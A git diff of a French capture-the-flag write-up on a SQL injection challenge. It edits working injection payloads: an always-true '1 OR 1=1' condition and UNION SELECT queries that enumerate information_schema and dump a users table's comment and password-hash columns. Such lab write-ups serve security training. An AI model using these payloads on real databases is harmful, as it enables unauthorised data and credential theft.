@@ -14,7 +14,7 @@ Une vulnérabilité SQL Injection permet d'extraire des données sensibles de la
 En essayant la condition toujours vraie `1 OR 1=1`, nous obtenons :
 
 ```sql
-ID: 1 OR 1=1; --
+1 OR 1=1; --
 First name: Flag
 Surname : GetThe
 ```
@@ -24,7 +24,7 @@ Surname : GetThe
 En utilisant une requête UNION pour lister les tables, nous trouvons :
 
 ```sql
-ID: 1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables; --
+1 AND 1=1 UNION SELECT 1, table_name FROM information_schema.tables; --
 First name: 1
 Surname : users
 ```
@@ -33,10 +33,10 @@ La table `users` semble intéressante, nous allons nous concentrer dessus.
 
 ### 3. Lister toutes les colonnes de la table `users`
 
-Nous listons les colonnes de la table `users` avec les requêtes suivantes :
+Nous listons les colonnes de la table `users` avec les requêtes suivantes , et on cherche la table users la dedans:
 
 ```sql
-ID: 1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns WHERE table_name = 'users'; --
+1 AND 1=1 UNION SELECT table_name, column_name FROM information_schema.columns; --
 ```
 
 Les colonnes découvertes sont :
@@ -55,7 +55,7 @@ Les colonnes découvertes sont :
 Nous allons essayer de voir ce qu'il y a dans chacune de ces colonnes. Après avoir vérifié plusieurs champs, nous trouvons des informations intéressantes dans les colonnes `Commentaire` et `countersign` :
 
 ```sql
-ID: 1 AND 1=1 UNION SELECT Commentaire, countersign FROM users; --
+1 AND 1=1 UNION SELECT Commentaire, countersign FROM users; --
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
 ```
